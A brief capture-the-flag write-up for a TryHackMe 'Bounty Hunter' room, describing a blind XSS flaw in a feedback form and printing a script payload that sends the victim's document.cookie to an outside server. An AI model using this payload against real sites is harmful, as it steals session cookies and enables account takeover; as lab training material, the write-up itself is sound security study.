# TryHackMe – Bounty Hunter (Blind XSS)

## Overview
This room simulated a bug bounty scenario involving input sanitization failures.

## Exploit
Discovered a blind XSS vulnerability in a feedback form:

```html
<script>new Image().src="http://myserver.com?cookie="+document.cookie</script>
